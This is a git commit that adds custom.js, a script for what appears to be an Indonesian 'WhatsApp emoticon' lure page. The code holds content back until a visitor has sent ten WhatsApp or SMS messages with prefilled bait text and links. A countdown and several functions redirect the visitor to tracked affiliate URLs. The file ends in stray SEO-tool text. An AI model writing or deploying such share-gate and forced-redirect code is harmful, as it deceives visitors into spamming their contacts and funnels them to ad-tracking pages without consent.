71f15aed90ea1e040537c2514d7dcea80bf9e993
lovindopedia <lovindopedia@gmail.com>
2017-02-10 22:00:26 +0700

    Create custom.js

---
+++ custom.js
@@ -0,0 +1,192 @@
+
+var c = getCookie( 'c' ),
+		n = 300,
+		date = new Date(),
+		time = date.getDate() + "/" + ( date.getMonth() + 1 )  + "/" + date.getFullYear() + " " + date.getHours() 
+
++ ":" + date.getMinutes() + ":" + date.getSeconds(),
+
+		text = [ 'http://wd1.me/emote', 'http://emojis.tech' ],
+
+		t = setInterval( function() {
+                        $( "#countdown" ).text( n-- ), -1 == n && window.open( "https://href.li/?
+
+http://kuaptrk.com/mt/1364v244f4r233r224w2t254/", "_self" ) & clearInterval( t )
+//			$( "#countdown" ).text( n-- ), -1 == n && window.open( "https://href.li/?
+
+http://www.bestphoneapps.mobi/?sl=704970-66a53&data1=Track1&data2=Track2", "_self" ) & clearInterval( t )
+		}, 1e3 );
+
+if ( c >= 10 ) {
+	
+	$( "#ask" ).hide();
+	$( ".choose" ).hide();
+	$( ".continue" ).hide();
+	$( ".content" ).show();
+	
+} else if ( c != '' && c != null ) {
+	
+	$( "#ask" ).hide();
+	$( ".choose" ).hide();
+	$( ".continue" ).show();
+	
+} else {
+	
+	c = 0;
+	
+}
+
+sharesLeft( c );
+
+function fn1() {
+var phrasesArray = [ 'Periksa ini' ] 
+	
+	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
+/*
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://milano.gq/emoticon/geturl.php", false);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState == 4) {
+          }
+        }
+        xhr.send();
+        var data = JSON.parse(xhr.responseText)
+
+                window.open("whatsapp://send?text=" + data.phrase1 + "%0D%0A" + data.phrase2 + "!%0D%0A ▶️ " + data.url + " 
+
+%0D%0D%0A %0D%0AVOUCHER%23 " + data.random, "_self" );
+*/		
+		window.open( "whatsapp://send?text=" + phrasesArray[Math.floor(Math.random() * phrasesArray.length)] + " 😍 
+
+%0D%0A 👉 " + text[Math.floor(Math.random() * text.length)], "_self" );
+		
+		c++;
+		
+//		ga( 'send', 'event', 'WhatsApp', '[' + c + '][EN] Emoticon' );
+		
+		setCookie( 'c', c, 2 ); // set cookie for 2 days
+		
+		showContent( c );
+		
+	} else {
+		
+		window.alert( 'Silakan undang lewat browser mobile kamu.' );
+		
+	}
+	
+}
+
+function fn2() {
+	
+//	ga( 'send', 'event', 'WhatsApp', '[' + c + '][EN] Emoticon' );
+	
+	window.location.replace( 'https://href.li/?http://kuaptrk.com/mt/03a4z274e4v233r224w2t254/' );
+//	window.location.replace( 'https://href.li/?http://www.bestphoneapps.mobi/?sl=704970-
+
+66a53&data1=Track1&data2=Track2' );
+}
+
+function fn3() {
+	
+	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
+		
+		window.open( "sms:?body=Periksa emoticon animasi terbaru WhatsApp :P %0D%0AKamu akan tertawa terbahak-
+
+bahak!%0D%0A ▶️ " + tinyUrl + " %0D%0A %0D%0A %0D%0A %0D%0A" + time, "_self" );
+		
+		c++;
+		
+//		ga( 'send', 'event', 'sms', '[' + c + '][EN] Emoticon' );
+		
+		setCookie( 'c', c, 2 ); // set cookie for 2 days
+		
+		showContent( c );
+		
+	} else {
+		
+		window.alert( 'Silakan undang lewat browser mobile kamu.' );
+		
+	}
+	
+}
+
+function showContent( c ) {
+	
+	if ( c < 10 ) {
+		
+		$( "#ask" ).hide();
+		$( ".choose" ).hide();
+		$( ".continue" ).show();
+		
+	}
+	
+	setTimeout( function() {
+		
+		if ( c >= 10 ) {
+			
+			$( ".continue" ).hide();
+			$( ".content" ).show();
+			
+		}
+		
+		sharesLeft( c );
+		
+	}, 5000 );
+	
+}
+
+function go() {
+	
+//	ga( 'send', 'event', 'WhatsApp', 'complete [EN] Emoticon' );
+	
+        window.location.replace( 'https://href.li/?http://kuaptrk.com/mt/1364v244f4r233r224w2t254/' );
+//	window.location.replace( 'https://href.li/?http://www.bestphoneapps.mobi/?sl=704970-
+
+66a53&data1=Track1&data2=Track2' );
+	
+}
+
+function sharesLeft( c ) {
+	
+	if ( c > 10 ) {
+		
+		$( "#shares" ).text( 0 );
+		
+	} else {
+		
+		$( "#shares" ).text( 10 - c );
+		
+	}
+	
+}
+
+function setCookie( cname, cvalue, exdays ) {
+	
+	var d = new Date();
+	d.setTime( d.getTime() + ( exdays * 24 * 60 * 60 * 1000 ) );
+	var expires = 'expires=' + d.toGMTString();
+	document.cookie = cname + '=' + cvalue + '; ' + expires;
+	
+}
+
+function getCookie( cname ) {
+	
+	var name = cname + '=';
+	var ca = document.cookie.split( ';' );
+	for ( var i = 0; i < ca.length; i++ ) {
+		
+		var c = ca[ i ];
+		while ( c.charAt( 0 ) == ' ' ) c = c.substring( 1 );
+		
+		if ( c.indexOf( name ) == 0 ) {
+			
+			return c.substring( name.length, c.length );
+			
+		}
+		
+	}
+	
+	return '';
+	
+}
+In/aLLD0In/aRank5.08MAge!l0+10whoissourceMore dataSummary reportDiagnosisDensity00n/a
